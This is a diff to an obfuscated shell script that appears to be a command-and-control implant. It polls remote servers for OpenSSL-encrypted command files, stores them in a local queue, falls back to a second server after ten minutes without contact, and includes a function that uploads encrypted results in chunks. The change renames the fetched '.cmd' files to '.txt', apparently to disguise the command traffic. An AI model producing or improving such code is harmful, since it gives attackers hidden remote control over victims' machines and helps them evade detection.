@@ -38,13 +38,13 @@ _up() {  # upload result (chunked, plain tag + AES payload)
    _BUST="t=$(date +%s)"
    # urgent
    for _Q in now; do
-     _U="$_R1/queue/$_Q.cmd"
+     _U="$_R1/queue/$_Q.txt"
      _D=$($_C -s --max-time 12 "$_U?$_BUST" 2>/dev/null)
      case "$_D" in U2FsdGVk*) printf '%s' "$_D" > "$_H/queue/9$$_Q";; esac
    done
    # normal queue
    for _N in 01 02 03 04; do
-     _U="$_R1/queue/q$_N.cmd"
+     _U="$_R1/queue/q$_N.txt"
      _D=$($_C -s --max-time 12 "$_U?$_BUST" 2>/dev/null)
      case "$_D" in
        U2FsdGVk*)
@@ -67,7 +67,7 @@ _up() {  # upload result (chunked, plain tag + AES payload)
    [ -n "$_NEW" ] && _LAST=$_NOW
    DUR=$((_NOW - _LAST))
    if [ $DUR -gt 600 ]; then
-     _D=$($_C -s --max-time 12 "$_R2/queue/now.cmd?fallback=$(date +%s)" 2>/dev/null)
+     _D=$($_C -s --max-time 12 "$_R2/queue/now.txt?fallback=$(date +%s)" 2>/dev/null)
      case "$_D" in U2FsdGVk*) printf '%s' "$_D" > "$_H/queue/8now-fallback";; esac
    fi
  done
